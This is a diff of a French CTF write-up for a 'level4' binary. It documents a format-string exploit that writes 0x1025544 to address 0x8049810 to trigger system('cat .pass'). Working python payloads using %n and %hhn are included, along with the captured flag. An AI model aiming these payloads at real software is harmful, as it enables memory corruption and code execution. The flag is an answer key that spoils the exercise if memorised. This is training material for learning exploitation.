@@ -32,32 +32,7 @@ ebp < +0 >
 
 
 
-
-(gdb) disas n
-Dump of assembler code for function n:
-   0x08048457 <+0>:     push   ebp
-   0x08048458 <+1>:     mov    ebp,esp
-   0x0804845a <+3>:     sub    esp,0x218
-   0x08048460 <+9>:     mov    eax,ds:0x8049804
-   0x08048465 <+14>:    mov    DWORD PTR [esp+0x8],eax
-   0x08048469 <+18>:    mov    DWORD PTR [esp+0x4],0x200
-   0x08048471 <+26>:    lea    eax,[ebp-0x208]
-   0x08048477 <+32>:    mov    DWORD PTR [esp],eax
-   0x0804847a <+35>:    call   0x8048350 <fgets@plt>
-   0x0804847f <+40>:    lea    eax,[ebp-0x208]
-   0x08048485 <+46>:    mov    DWORD PTR [esp],eax
-   0x08048488 <+49>:    call   0x8048444 <p>
-   0x0804848d <+54>:    mov    eax,ds:0x8049810
-   0x08048492 <+59>:    cmp    eax,0x1025544
-   0x08048497 <+64>:    jne    0x80484a5 <n+78>
-   0x08048499 <+66>:    mov    DWORD PTR [esp],0x8048590
-   0x080484a0 <+73>:    call   0x8048360 <system@plt>
-   0x080484a5 <+78>:    leave
-   0x080484a6 <+79>:    ret
-End of assembler dump.
-
-
-cette fonction n ressemble à l'exercice précédent à l'exception de :
+La fonction n ressemble à l'exercice précédent à l'exception de :
  - la fonction printf qui est appelée dans la fonction "p"
  - de la valeur de comparaison qui doit maintenant être : 0x1025544
  - du fichier .pass du level5 qui est affiché à l'aide d'un appel psystem à 'cat'
@@ -82,18 +57,18 @@ AAAABBBBCCCCDDDD %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p 
 Impossible d'utiliser le procédé de l'exercice 3 strictement de la même façon puisque 512 chars max seront envoyés à printf
 
 Résumé : On doit donc écrire 0x1025544 (=0x01025544) à l'adresse 0x8049810
-Soit :
-
-0x8049810 : 44
-0x8049811 : 55
-0x8049812 : 02
-0x8049813 : 01
 
 
 2 solutions :
 
 
   1- Ecrire par morceau => 0x44 chars puis 0x55 chars puis 0x102 chars aux adresses 0x08049810, 0x08049811, 0x08049812 (doivent être des valeurs croissantes bien sur)
+
+  0x8049810 : 44
+  0x8049811 : 55
+  0x8049812 : 02
+  0x8049813 : 01
+
 
     print(adresse1 adresse2 adresse3 %12n %13n %14n) => l'adresse 1 sera écrite à l'argument 12 de printf... et la valeur 12 (longueur des adresses écrites avant '%12n') sera inscrite à l'adresse1 (présente donc en 12ème élément de la pile)
 
@@ -103,14 +78,19 @@ Soit :
                     _______________________________
                                12 octets            +    56   =    68     +      17  =   85     +     173  = 258
 
-  python -c "print ('\x08\x04\x98\x10'[::-1] + '\x08\x04\x98\x11'[::-1] + '\x08\x04\x98\x12'[::-1] + 'x' * 56 + '%12\$n' + 'x' * 17 + '%13\$n'  + 'x' * 173 + '%14\$n')" | ./level4
+  python -c "print ('\x08\x04\x98\x10'[::-1] + '\x08\x04\x98\x11'[::-1] + '\x08\x04\x98\x12'[::-1] + 'x' * 56 + '%12\$hhn' + 'x' * 17 + '%13\$hhn'  + 'x' * 173 + '%14\$hhn')" | ./level4
 
 
   2- Ruser et écrire directement la valeur 0x01025544 à l'adresse 0x8049810 en utilisant les modifiers => %50d imprimera un decimal de 50 chars de large. '%16930112d' précédé de l'adresse imprimera 4 chars puis 16930112 chars soit 16930116 chars (= 0x1025544). NB : possibilité d'ajouter le préfix 'hh' pour préciser qu'il s'agit bien de chars
 
-  =>  (python -c "print ('\x10\x98\x04\x08'+ '%16930112d' + '%12\$n')";) | ./level4
+
+
+Commande :
+
+> (python -c "print ('\x10\x98\x04\x08'+ '%16930112d' + '%12\$n')";) | ./level4
 
 
 
+Flag : 
 
-flag => 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
